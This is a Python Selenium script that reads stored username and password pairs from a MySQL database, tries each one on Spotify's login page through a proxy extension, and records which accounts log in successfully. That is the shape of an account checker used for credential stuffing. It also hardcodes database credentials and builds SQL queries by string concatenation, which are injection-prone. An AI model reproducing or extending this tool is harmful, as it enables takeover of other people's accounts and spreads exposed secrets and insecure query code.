from time import sleep
import MySQLdb
import os
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import NoSuchElementException
from proxy_function import proxy_connect

def checker(prox_y,port):
   try:
       cnx = MySQLdb.connect("sql148.main-hosting.eu","u474651307_user1","Pa$$w0rd","u474651307_spoti")
       cursor = cnx.cursor()
       cursor.execute("select * from account where error = 0 order by in_use asc")  
       account = cursor.fetchall() 
   except MySQLdb.Error as err:      
       print("Something went wrong: 2{}".format(err))   
   for a in account:
       sleep(15)
       executable_path = "./chromedriver"
       os.environ["webdriver.chrome.driver"] = executable_path
       chrome_options = Options()
       chrome_options.add_extension('Chrome-proxy-helper-master.crx')
       chrome_options.add_extension('extension_2_0_0_0.crx')
       #capabilities = webdriver.DesiredCapabilities.CHROME
       #prox.add_to_capabilities(capabilities)
       driver = webdriver.Chrome(executable_path=executable_path, chrome_options=chrome_options)
       driver.get("chrome-extension://lkmofgnohbedopheiphabfhfjgkhfcgf/popup.html")
       driver.execute_script("window.open('https://accounts.spotify.com/en/login', 'w1')")
       try:
          driver.find_element_by_xpath("//a[@id='iPad']").click()
       except NoSuchElementException:
          print("NoSuchElementException : User agent Mobile") 
       sleep(5) 
       driver.switch_to.window("w1")
       driver.get("https://accounts.spotify.com/en/login")
    
   
       #login
       driver.find_element_by_xpath("//input[@id='login-username']").clear()
       driver.find_element_by_xpath("//input[@id='login-password']").clear()
       driver.find_element_by_xpath("//input[@id='login-username']").send_keys(a[1])
       driver.find_element_by_xpath("//input[@id='login-password']").send_keys(a[2])
       driver.find_element_by_xpath("//button[@id='login-button']").click()
      
   
       try:
           #if connect
           sleep(3)
           o=driver.find_element_by_css_selector("button.btn.btn-sm.btn-block.btn-green.ng-binding.ng-scope")                   
           connect=1
           try:
              cnx = MySQLdb.connect("sql148.main-hosting.eu","u474651307_user1","Pa$$w0rd","u474651307_spoti")
              cursor = cnx.cursor()
              req="UPDATE `account` SET `error`= 2  where `user` = '"+str(a[1])+"' and `password` = '"+str(a[2])+"' " 
              cursor.execute(req)
              cnx.commit()
              cnx.close()
             
           except MySQLdb.Error as err:      
              print("Something went wrong: 2{}".format(err))   
          
       except NoSuchElementException:
           connect=0


           try:
              cnx = MySQLdb.connect("sql148.main-hosting.eu","u474651307_user1","Pa$$w0rd","u474651307_spoti")
              cursor = cnx.cursor()
              req="UPDATE `account` SET `error`= 1  where `user` = '"+str(a[1])+"' and `password` = '"+str(a[2])+"' " 
              cursor.execute(req)
              cnx.commit()
              cnx.close()
           except MySQLdb.Error as err:      
              print("Something went wrong: 2{}".format(err))   
       
       driver.close()
